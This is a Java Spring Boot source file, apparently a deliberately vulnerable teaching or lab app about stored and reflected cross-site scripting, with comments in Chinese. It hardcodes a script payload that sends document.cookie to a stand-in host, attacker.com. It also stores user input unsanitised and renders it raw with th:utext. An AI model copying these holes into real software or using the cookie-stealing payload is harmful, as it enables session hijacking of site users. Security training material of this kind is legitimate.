import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.*;
import java.util.HashMap;
import java.util.Map;

@SpringBootApplication
public class XssVulnerableApp {
    static Map<String, String> adDatabase = new HashMap<>();

    public static void main(String[] args) {
        SpringApplication.run(XssVulnerableApp.class, args);
    }

    @Controller
    class AdController {
        @GetMapping("/crawl")
        public String crawlAd(@RequestParam String url, Model model) {
            // 模拟爬虫抓取广告内容
            String adContent = "<div>促销活动：<script>"+"document.write('<img src=//attacker.com/steal?cookie='+document.cookie+'>');"+"</script></div>";
            adDatabase.put(url, adContent);
            model.addAttribute("adContent", adContent);
            return "ad_preview";
        }

        @PostMapping("/submit")
        public String submitAd(@RequestParam String url, @RequestBody String content) {
            // 存储型XSS漏洞点：直接存储用户输入
            adDatabase.put(url, content);
            return "redirect:/crawl?url="+url;
        }

        @GetMapping("/search")
        public String searchAd(@RequestParam String keyword, Model model) {
            // 反射型XSS漏洞点：未转义搜索关键词
            model.addAttribute("keyword", keyword);
            return "search_results";
        }
    }
}

// templates/ad_preview.html
// <!DOCTYPE html>
// <html xmlns:th="http://www.thymeleaf.org">
// <body>
//   <div th:utext="${adContent}"></div>  // 不安全的原始HTML渲染
// </body>
// </html>

// templates/search_results.html
// <!DOCTYPE html>
// <html xmlns:th="http://www.thymeleaf.org">
// <body>
//   <p>搜索结果包含："<script>"+"alert('xss'+document.cookie)"+"</script>"</p>
//   <p th:text="'关键词：' + ${keyword}"></p>  // 本应安全但被错误使用
// </body>
// </html>